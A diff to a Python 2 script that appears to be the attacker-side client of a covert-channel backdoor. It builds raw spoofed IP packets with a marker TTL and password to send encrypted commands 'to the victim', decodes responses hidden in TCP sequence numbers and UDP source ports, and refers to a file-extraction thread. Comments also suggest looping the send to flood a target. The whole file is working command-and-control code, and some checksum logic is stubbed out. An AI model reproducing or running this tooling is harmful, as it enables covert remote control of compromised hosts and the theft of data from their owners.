@@ -83,7 +83,7 @@ def checksum(msg):
 	return s
 
 def string_bin(string):
-    return ''.join(format(ord(c), 'b') for c in string)
+	return ''.join(format(ord(c), 'b') for c in string)
 
 
 
@@ -121,10 +121,10 @@ def getCmd():
 			password = encrypt("pass")
 			#convert password to binary
 			password = string_bin(password)
-            '''
-            #create a packet to send to the victim
-                sendCommand(protocol, encryptedCmd, 1000)
-                sniffer()
+			'''
+			#create a packet to send to the victim
+			sendCommand(protocol, encryptedCmd, 1000)
+			sniffer()
 
 
 
@@ -147,7 +147,10 @@ def sendCommand(protocol, data, password):
 	ip_id = 54321  # Id of this packet
 	ip_frag_off = 0
 	ip_ttl = 144
-	ip_proto = socket.IPPROTO_TCP
+	if (protocol == "TCP"):
+		ip_proto = socket.IPPROTO_TCP
+	if (protocol == "UDP"):
+		ip_proto = socket.IPPROTO_UDP
 	ip_check = 0  # kernel will fill the correct checksum
 	ip_saddr = socket.inet_aton(srcIP)  # Spoof the source ip address if you want to
 	ip_daddr = socket.inet_aton(dstIP)
@@ -160,6 +163,7 @@ def sendCommand(protocol, data, password):
 
 
 	if(protocol == "TCP"):
+		print "create TCP header"
 		# tcp header fields
 		tcp_source = 1234  # source port
 		tcp_dest = 80  # destination port
@@ -182,189 +186,203 @@ def sendCommand(protocol, data, password):
 		tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
 
 		# the ! in the pack format string means network order
-		tcp_header = pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,
-						  tcp_window, tcp_check, tcp_urg_ptr)
-
-
-
+		tcp_header = pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
 		# pseudo header fields
 		source_address = socket.inet_aton(srcIP)
 		dest_address = socket.inet_aton(dstIP)
 		placeholder = 0
 		protocol = socket.IPPROTO_TCP
 		tcp_length = len(tcp_header) + len(data)
-
 		psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length);
 		psh = psh + tcp_header + data;
-        #tcp_check = checksum(psh)
+		#tcp_check = checksum(psh)
 		tcp_check = 10
-
 		# print tcp_checksum
-
 		# make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
-		tcp_header = pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,
-						  tcp_window) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)
+		tcp_header = pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)
+		#final full packet - syn packets dont have any data
+		packet = ip_header + tcp_header + data
 
-		# final full packet - syn packets dont have any data
-        packet = ip_header + tcp_header + data
+
+
 
 	if (protocol == "UDP"):
 		print "create UDP header"
+		data = data
+		sport = password
+		dport = 8505
+		length = 8+len(data)
+		checksum = 0
+		udp_header = pack('!HHHH', sport, dport, length, checksum)
+		packet = ip_header + udp_header + data
 
 	# Send the packet finally - the port specified has no effect
 	s.sendto(packet, (dstIP, 0))  # put this in a loop if you want to flood the target
 
 
+
+
 def sniffer():
-    # list all devices
-    devices = pcapy.findalldevs()
-    print devices
+	# list all devices
+	devices = pcapy.findalldevs()
+	print devices
 
-    # ask user to enter device name to sniff
-    print "Available devices are :"
-    for d in devices:
-        print d
+	'''
+	# ask user to enter device name to sniff
+	print "Available devices are :"
+	for d in devices:
+		print d
+	'''
+	'''
+	dev = raw_input("Enter device name to sniff : ")
 
-    '''
-    dev = raw_input("Enter device name to sniff : ")
+	print "Sniffing device " + dev
+	'''
+	'''
+	open device
+	# Arguments here are:
+	#   device
+	#   snaplen (maximum number of bytes to capture _per_packet_)
+	#   promiscious mode (1 for true)
+	#   timeout (in milliseconds)
+	'''
+	cap = pcapy.open_live("lo", 65536, 1, 0)
 
-    print "Sniffing device " + dev
-    '''
-    '''
-    open device
-    # Arguments here are:
-    #   device
-    #   snaplen (maximum number of bytes to capture _per_packet_)
-    #   promiscious mode (1 for true)
-    #   timeout (in milliseconds)
-    '''
-    cap = pcapy.open_live("lo", 65536, 1, 0)
-
-    # start sniffing packets
-    while (1):
-        (header, packet) = cap.next()
-        # print ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen()))
-        command = parse_packet(packet)
-        if(command == True):
-            break
+	# start sniffing packets
+	while (1):
+		(header, packet) = cap.next()
+		# print ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen()))
+		command = parse_packet(packet)
+		if(command == True):
+			break
 
 # function to parse a packet
 def parse_packet(packet):
-    # parse ethernet header
-    eth_length = 14
+	# parse ethernet header
+	eth_length = 14
 
-    eth_header = packet[:eth_length]
-    eth = unpack('!6s6sH', eth_header)
-    eth_protocol = socket.ntohs(eth[2])
-    '''
-    print 'Destination MAC : ' + eth_addr(packet[0:6]) + ' Source MAC : ' + eth_addr(
-        packet[6:12]) + ' Protocol : ' + str(eth_protocol)
-    '''
+	eth_header = packet[:eth_length]
+	eth = unpack('!6s6sH', eth_header)
+	eth_protocol = socket.ntohs(eth[2])
+	'''
+	print 'Destination MAC : ' + eth_addr(packet[0:6]) + ' Source MAC : ' + eth_addr(
+		packet[6:12]) + ' Protocol : ' + str(eth_protocol)
+	'''
 
-    # Parse IP packets, IP Protocol number = 8
-    if eth_protocol == 8:
-        # Parse IP header
-        # take first 20 characters for the ip header
-        ip_header = packet[eth_length:20 + eth_length]
+	# Parse IP packets, IP Protocol number = 8
+	if eth_protocol == 8:
+		# Parse IP header
+		# take first 20 characters for the ip header
+		ip_header = packet[eth_length:20 + eth_length]
 
-        # now unpack them :)
-        iph = unpack('!BBHHHBBH4s4s', ip_header)
+		# now unpack them :)
+		iph = unpack('!BBHHHBBH4s4s', ip_header)
 
-        version_ihl = iph[0]
-        version = version_ihl >> 4
-        ihl = version_ihl & 0xF
+		version_ihl = iph[0]
+		version = version_ihl >> 4
+		ihl = version_ihl & 0xF
 
-        iph_length = ihl * 4
+		iph_length = ihl * 4
 
-        ttl = iph[5]
+		ttl = iph[5]
 
-        # check if ttl is 144
-        if (ttl == 144):
-            protocol = iph[6]
-            s_addr = socket.inet_ntoa(iph[8]);
-            d_addr = socket.inet_ntoa(iph[9]);
-            '''
-            print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(
-                ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(
-                s_addr) + ' Destination Address : ' + str(d_addr)
-            '''
-            # TCP protocol
-            if protocol == 6:
-                t = iph_length + eth_length
-                tcp_header = packet[t:t + 20]
+		# check if ttl is 144
+		if (ttl == 144):
+			protocol = iph[6]
+			s_addr = socket.inet_ntoa(iph[8]);
+			d_addr = socket.inet_ntoa(iph[9]);
+			'''
+			print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(
+				ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(
+				s_addr) + ' Destination Address : ' + str(d_addr)
+			'''
+			# TCP protocol
+			if protocol == 6:
+				t = iph_length + eth_length
+				tcp_header = packet[t:t + 20]
 
-                # now unpack them :)
-                tcph = unpack('!HHLLBBHHH', tcp_header)
+				# now unpack them :)
+				tcph = unpack('!HHLLBBHHH', tcp_header)
 
-                # check if payload is our password
-                # get password from the packet
-                doff_reserved = tcph[4]
-                tcph_length = doff_reserved >> 4
-                h_size = eth_length + iph_length + tcph_length * 4
-                data_size = len(packet) - h_size
-                password = packet[h_size:]
-
-                #if(password == 1000):
-                source_port = tcph[0]
-                dest_port = tcph[1]
-                sequence = tcph[2]
-                acknowledgement = tcph[3]
-                '''
-                print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(
-                    dest_port) + ' Sequence Number : ' + str(
-                    sequence) + ' Acknowledgement : ' + str(acknowledgement) + ' TCP header length : ' + str(
-                    tcph_length)
-                '''
-
-                result = chr(sequence)
-                #result = decrypt(sequence)
+				# check if payload is our password
+				# get password from the packet
+				doff_reserved = tcph[4]
+				tcph_length = doff_reserved >> 4
+				h_size = eth_length + iph_length + tcph_length * 4
+				data_size = len(packet) - h_size
+				password = packet[h_size:]
 
 
-                #print 'Data : ' + result
-                print result,
-                if (iph[3] == 2):
-                    return True
+				if(password == "1000"):
+					source_port = tcph[0]
+					dest_port = tcph[1]
+					sequence = tcph[2]
+					acknowledgement = tcph[3]
+					'''
+					print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(
+						dest_port) + ' Sequence Number : ' + str(
+						sequence) + ' Acknowledgement : ' + str(acknowledgement) + ' TCP header length : ' + str(
+						tcph_length)
+					'''
 
-            # UDP packets
-            elif protocol == 17:
-                u = iph_length + eth_length
-                udph_length = 8
-                udp_header = packet[u:u + 8]
+					result = chr(sequence)
+					#result = decrypt(sequence)
 
-                # now unpack them :)
-                udph = unpack('!HHHH', udp_header)
 
-                source_port = udph[0]
-                dest_port = udph[1]
-                length = udph[2]
-                checksum = udph[3]
+					#print 'Data : ' + result
+					print result,
+					if (iph[3] == 2):
+						return True
 
-                print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(
-                    length) + ' Checksum : ' + str(checksum)
+			# UDP packets
+			elif protocol == 17:
+				udph_length = 8
+				h_size = eth_length + iph_length + udph_length
+				password = packet[h_size:]
+				#print "test"
+				#print password
+				if(password == "1000"):
+					u = iph_length + eth_length
 
-                h_size = eth_length + iph_length + udph_length
-                data_size = len(packet) - h_size
+					udp_header = packet[u:u + 8]
 
-                # get data from the packet
-                data = packet[h_size:]
+					# now unpack them :)
+					udph = unpack('!HHHH', udp_header)
 
-                print 'Data : ' + decrypt(data)
+					source_port = udph[0]
+					dest_port = udph[1]
+					length = udph[2]
+					checksum = udph[3]
+					'''
+					print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(
+						length) + ' Checksum : ' + str(checksum)
+					'''
+
+					data_size = len(packet) - h_size
+
+
+					# get data from the packet
+					result = source_port
+					result = chr(source_port)
+
+					print result,
+					if (iph[3] == 2):
+						return True
 
 
 
 #2 main threads. User commands & file extraction
 def main():
-    checkRoot()
+	checkRoot()
 
-
-    cmdThread = threading.Thread(target=getCmd)
-    #fileThread = threading.Thread(target=getFile, args=(dstIP, srcIP, dstPort))
+	cmdThread = threading.Thread(target=getCmd)
+	#fileThread = threading.Thread(target=getFile, args=(dstIP, srcIP, dstPort))
 	
-    cmdThread.start()
+	cmdThread.start()
 	#fileThread.start()
 
 if __name__== '__main__':
-    try:
-        main()
-    except KeyboardInterrupt:
-        print "exiting.."
+	try:
+		main()
+	except KeyboardInterrupt:
+		print "exiting.."
